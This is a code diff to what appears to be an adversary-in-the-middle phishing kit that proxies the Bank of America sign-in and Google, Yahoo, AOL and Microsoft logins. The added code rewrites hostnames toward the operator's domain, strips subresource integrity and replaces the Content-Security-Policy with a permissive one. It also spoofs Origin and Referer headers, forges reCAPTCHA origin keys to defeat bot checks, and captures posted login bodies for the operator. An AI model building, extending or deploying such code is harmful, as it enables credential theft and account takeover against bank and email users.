@@ -15,8 +15,13 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
+        if (this.browserReq.url.startsWith('/recaptcha')) {
+            return this.browserReq.pipe(this.proxyEndpoint)
+        }
         return super.processRequest()
+
     }
+
 }
 
 const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
@@ -24,7 +29,40 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
     constructor(proxyResp, browserEndPoint) {
 
         super(proxyResp, browserEndPoint)
-        this.regexes = []
+        this.regexes = [
+            {
+                reg: /play.google.com/ig,
+                replacement: `${process.env.HOST_DOMAIN}/playboy`,
+            },
+            {
+                reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
+                replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
+            },
+            {
+                reg: /name="checkConnection" value/gi,
+                replacement: /name"checkConnection" value="youtube:1052:1"/,
+            },
+            {
+                reg: /www\.google\.com/,
+                replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /login\.yahoo\.net/,
+                replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /www.gstatic.com/,
+                replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /integrity/,
+                replacement:'xintegrity'
+            },
+            {
+                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/,
+                replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
+            }
+        ]
     }
 
 
@@ -55,8 +93,8 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             }           
         }
 
-        // return super.processResponse()
-         let newMsgBody;
+        
+        let newMsgBody;
         return this.superPrepareResponse(true)
             .then((msgBody) => {
                 newMsgBody = msgBody
@@ -84,6 +122,11 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
+        this.req.headers['origin'] = `https://${clientContext.currentDomain}`
+
+        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''
+
+        
         if (this.req.method === 'POST') {
             clientContext.setLogAvailable(true)
             super.captureBody(clientContext.currentDomain, clientContext)
@@ -102,6 +145,28 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                 this.res.writeHead(302, {location: '/login/sign-in/signOnV2Screen.go'})
                 return super.cleanEnd(clientContext.currentDomain, clientContext)
             }
+        }
+
+        const redirectToken = this.checkForRedirect()
+        if (redirectToken !== null) {
+            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)
+
+            if (redirectToken.url.startsWith('https://myaccount.google.com/') || 
+                redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
+                super.sendClientData(clientContext, {})
+                this.res.writeHead(302, { location: '/auth/login/finish' })
+                return super.cleanEnd('PHP-EXEC', clientContext)
+            }
+
+            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
+            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
+                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')
+
+            } else {
+                this.req.url = reqCheck 
+            }
+
+            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
         }
 
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
@@ -160,7 +225,8 @@ const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
             if (this.req.url === '/auth/login/yahoo') {
                 this.req.url = '/'
                 clientContext.currentDomain = 'login.yahoo.com'
-                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+                this.res.writeHead(302, {location: '/'})
+                return this.res.end('')
             }
             if (this.req.url === '/auth/login/comcast') {
                 this.req.url = '/login?r=comcast.net&s=oauth'
@@ -170,7 +236,8 @@ const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
             if (this.req.url === '/auth/login/aol') {
                 this.req.url = '/'
                 clientContext.currentDomain = 'login.aol.com'
-                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+                this.res.writeHead(302, {location: '/'})
+                return this.res.end('')
             }
             if (this.req.url === '/auth/login/gmail') {
                 // eslint-disable-next-line max-len
@@ -185,12 +252,14 @@ const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
                 this.req.headers['accept-encoding'] = 'gzip, br'
                 this.req.url = '/'
                 clientContext.currentDomain = 'login.live.com'
-                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+                this.res.writeHead(302, {location: '/'})
+                return this.res.end('')
             }
             if (this.req.url === '/auth/login/office') {
                 this.req.url = '/'
                 clientContext.currentDomain = 'login.microsoftonline.com'
-                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+                this.res.writeHead(302, {location: '/'})
+                return this.res.end('')
             }
             if (this.req.url === '/auth/login/att') {
                 // this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
@@ -211,6 +280,64 @@ const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
 }
 
 
+const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
+    constructor(req, res, captureDict = configExport.CAPTURES) {
+        super(req, res, captureDict)
+    }
+
+    static match(req) {
+        return req.url.startsWith('/recaptcha/');
+
+    }
+
+    execute(clientContext) {
+
+        this.req.headers['origin'] = `https://${clientContext.currentDomain}`
+
+        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''
+
+
+        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
+            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
+            const hostnameBase64Key = hostnameKey.toString('base64');
+            console.log(hostnameBase64Key)
+
+            this.req.url = this.req.url.replace('..', '==')
+            this.req.url = this.req.url.replace('.&', '=&')
+
+
+            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')
+
+            
+            console.log(this.req.url)
+            return super.superExecuteProxy('www.google.com', clientContext)
+
+
+        }
+
+
+        if (this.req.url.startsWith('/recaptcha/enterprise')) {
+            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
+            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''
+
+
+            console.log(JSON.stringify(this.req.headers))
+            
+            return super.superExecuteProxy('www.google.com', clientContext)
+
+        }
+
+       
+
+        if (this.req.url.startsWith('/recaptcha/releases')) {
+            return super.superExecuteProxy('www.gstatic.com', clientContext)
+
+        }
+
+
+    }
+}
+
 const configExport = {
     CURRENT_DOMAIN: 'secure.bankofamerica.com',
     START_PATH: '/login/sign-in/signOnV2Screen.go',
@@ -218,6 +345,7 @@ const configExport = {
         [
             EmailLoginHandler,
             ExecPhpPager,
+            RecaptchaHandler
         ],
     PROXY_REQUEST: ProxyRequest,
     PROXY_RESPONSE: ProxyResponse,
